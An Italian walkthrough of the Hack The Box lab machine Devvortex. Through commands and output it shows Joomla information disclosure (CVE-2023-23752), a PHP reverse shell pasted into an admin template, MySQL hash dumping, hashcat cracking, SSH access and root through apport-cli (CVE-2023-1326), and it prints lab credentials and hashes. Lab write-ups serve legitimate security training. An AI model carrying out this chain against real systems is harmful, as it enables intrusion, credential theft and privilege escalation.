---
title: Devvortex Walkthrough
description: Devvortex è una macchina Linux di difficoltà easy che presenta un CMS Joomla vulnerabile a information disclosure. L'accesso al file di configurazione del servizio rivela credenziali in chiaro che portano all'accesso amministrativo dell'istanza Joomla. Con i privilegi di amministratore, il template Joomla viene modificato per includere codice PHP malevolo e ottenere una shell. Dopo aver ottenuto la shell ed enumerato i contenuti del database, vengono recuperate credenziali in hash, che vengono crackate e portano all'accesso SSH della macchina. L'enumerazione post-exploitation rivela che l'utente è autorizzato ad eseguire apport-cli come root, vulnerabilità sfruttata per ottenere una shell con privilegi root.
author: dua2z3rr
date: 2025-09-25 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Common Applications", "Area di Interesse: Databases", "Area di Interesse: Web Application", "Vulnerabilità: Weak Credentials", "Vulnerabilità: Information Disclosure", "Vulnerabilità: Misconfiguration"]
image: /assets/img/devvortex/devvortex-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo con uno scan Nmap per capire la superficie d'attacco.

```shell
┌─[eu-vip-21]─[10.10.14.6]─[dua2z3rr@htb-irxnygkfue]─[~]
└──╼ [★]$ sudo nmap 10.10.11.242 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

<SNIP>

┌─[eu-vip-21]─[10.10.14.6]─[dua2z3rr@htb-irxnygkfue]─[~]
└──╼ [★]$ sudo nmap 10.10.11.242 -vv -p 22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP

Andiamo sulla porta 80 attraverso il browser dopo aver aggiunto il record al file `/etc/hosts`

![Desktop View](/assets/img/devvortex/devvortex-homepage.png)

Riapriamo il sito nel browser di **Burp Suite**.

Nulla sul sito ci reindirizza, e se ci sono pagine interessanti (come la **contact** page), non fanno alcuna web request e ci riportano alla home page.

### Ffuf

Proviamo a fare fuzzing delle directory della web app.

```shell
┌─[eu-vip-21]─[10.10.14.6]─[dua2z3rr@htb-irxnygkfue]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://devvortex.htb/FUZZ -recursion -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
```

Sfortunatamente, non troviamo nulla. Procediamo quindi a fare fuzzing dei subdomains.

```shell
┌─[eu-vip-21]─[10.10.14.6]─[dua2z3rr@htb-irxnygkfue]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://FUZZ.devvortex.htb/ -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.devvortex.htb/
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
```

Nemmeno il fuzzing dei subdomains ha effetto. Proviamo allora coi **virtual-hosts**.

```shell
┌─[eu-vip-21]─[10.10.14.6]─[dua2z3rr@htb-irxnygkfue]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 118ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Abbiamo trovato il virtual-host **dev**.

> Il flag di ffuf **-fw** serve per filtrare le risposte, escludendo quelle che hanno un certo numero di parole.
{: .prompt-info }

### dev VHost

Dopo aver aggiunto il Vhost **dev** sul file `/etc/hosts`, accediamoci tramite browser.

![Desktop View](/assets/img/devvortex/devvortex-virtual-host.png)

Andando sulla directory `/administrator` accediamo alla pagina di login dell'amministratore.

![Desktop View](/assets/img/devvortex/devvortex-admin-login-page.png)

Leggendo la documentazione di Joomla veniamo a conoscienza di un endpoint chiamato **cms_version** che ci permette di vedere la versione del CMS.

![Desktop View](/assets/img/devvortex/devvortex-endpoint-version.png)

La versione è la **4.2.6**.

### Ricerca Exploit

![Desktop View](/assets/img/devvortex/devvortex-exploit-1.png)

### Exploit

```shell
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/joomla_api_improper_access_checks) >> exploit
[+] Users JSON saved to /home/dua2z3rr/.msf4/loot/20250925220638_default_10.10.11.242_joomla.users_171074.bin
[+] Joomla Users
============

 ID   Super User  Name        Username  Email                Send Email  Register Date        Last Visit Date      Group Names
 --   ----------  ----        --------  -----                ----------  -------------        ---------------      -----------
 649  *           lewis       lewis     lewis@devvortex.htb  1           2023-09-25 16:44:24  2023-10-29 16:18:50  Super Users
 650              logan paul  logan     logan@devvortex.htb  0           2023-09-26 19:15:42                       Registered

[+] Config JSON saved to /home/dua2z3rr/.msf4/loot/20250925220638_default_10.10.11.242_joomla.config_720584.bin
[+] Joomla Config
=============

 Setting        Value
 -------        -----
 db encryption  0
 db host        localhost
 db name        joomla
 db password    P4ntherg0t1n5r3c0n##
 db prefix      sd4fg_
 db user        lewis
 dbtype         mysqli

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Entrando sulla login page dell'admin con le credenziali `lewis:P4ntherg0t1n5r3c0n##` riusciamo ad accedere alla dashboard.

![Desktop View](/assets/img/devvortex/devvortex-admin-dashboard.png)

### Admin Dashboard

Iniziamo a enumerare la dashboard.

Prima di tutto, vedo che esiste un altro utente di nome logan.

![Desktop View](/assets/img/devvortex/devvortex-logan.png)

Notiamo che possiamo modificare i template, soprattutto quello dell'admin.

![Desktop View](/assets/img/devvortex/devvortex-template.png)

Incolliamo dentro la reverse shell di **pentestmonkey** e otteniamo una reverse shell.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.11.242 38918
Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 20:24:28 up  7:34,  0 users,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Shell come www-data

### Enumerazione Interna

Grazie all'exploit di prima abbiamo capito che è presente una istanza di **MySQL**. Accediamoci con le credenziali di lewis.

```shell
www-data@devvortex:/$ mysql -u lewis -p
mysql -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 177274
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Ora enumeriamo i database per aiutarci con la lateral escalation.

```mysql
mysql> show databases
show databases
    -> ;
;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla
use joomla
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;

+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select * from sd4fg_users;
select * from sd4fg_users;

+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-09-25 20:08:07 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$jcRwMgo7QXlX68cARD2TLe.VWHu/v3f9Gk2qm9n2I9NKXLYPTdh7C |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)
```

Notiamo l'ash di logan, usiamo hashcat per crackarlo.

### Hashcat

Identifichiamo l'hash tramite **hashid**...

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashid -m hash
--File 'hash'--
Analyzing '$2y$10$jcRwMgo7QXlX68cARD2TLe.VWHu/v3f9Gk2qm9n2I9NKXLYPTdh7C'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'hash'--
```

...e ora lo crackiamo con hashcat.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -a 0 -m 3200 hash /home/dua2z3rr/SecLists/Passwords/rockyou/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /home/dua2z3rr/SecLists/Passwords/rockyou/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs
```

La password finale è: **tequieromucho**. proviamo ad accere a ssh con questa password.

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh logan@10.10.11.242
logan@10.10.11.242's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 25 Sep 2025 08:49:58 PM UTC

  System load:  0.16              Processes:             167
  Usage of /:   78.2% of 4.76GB   Users logged in:       0
  Memory usage: 32%               IPv4 address for eth0: 10.10.11.242
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
logan@devvortex:~$ ls
user.txt
```

## Shell come Logan

### Privilege Escalation

Come sempre eseguiamo sudo -l

```shell
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Possiamo eseguire `/usr/bin/apport-cli` come sudo.

### Ricerca exploit

```shell
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
```

Se cerchiamo un exploit troveremo la vulnerabilità **CVE-2023-1326**. 

### Exploit

```shell
logan@devvortex:~$ ps -ux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
logan       3239  0.0  0.2  19040  9628 ?        Ss   20:49   0:00 /lib/systemd/systemd --user
logan       3244  0.0  0.0 169204  3240 ?        S    20:49   0:00 (sd-pam)
logan       3345  0.0  0.1  14060  6024 ?        S    20:49   0:00 sshd: logan@pts/1
logan       3347  0.0  0.1  10128  5584 pts/1    Ss   20:49   0:00 -bash
logan       3594  0.0  0.0  10808  3548 pts/1    R+   21:05   0:00 ps -ux
logan@devvortex:~$ sudo /usr/bin/apport-cli -f -P 3239

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
............
*** It seems you have modified the contents of "/etc/systemd/journald.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): y

*** It seems you have modified the contents of "/etc/systemd/resolved.conf".  Would you like to add the contents of it to your bug report?


What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): 

What would you like to do? Your options are:
  Y: Yes
  N: No
  C: Cancel
Please choose (Y/N/C): y
.................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (737.3 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
root@devvortex:/home/logan#
```

Per ottenre root bisogna scrivere quando si vede `:` ls stringa `/bin/bash`. terminiamo così la box.
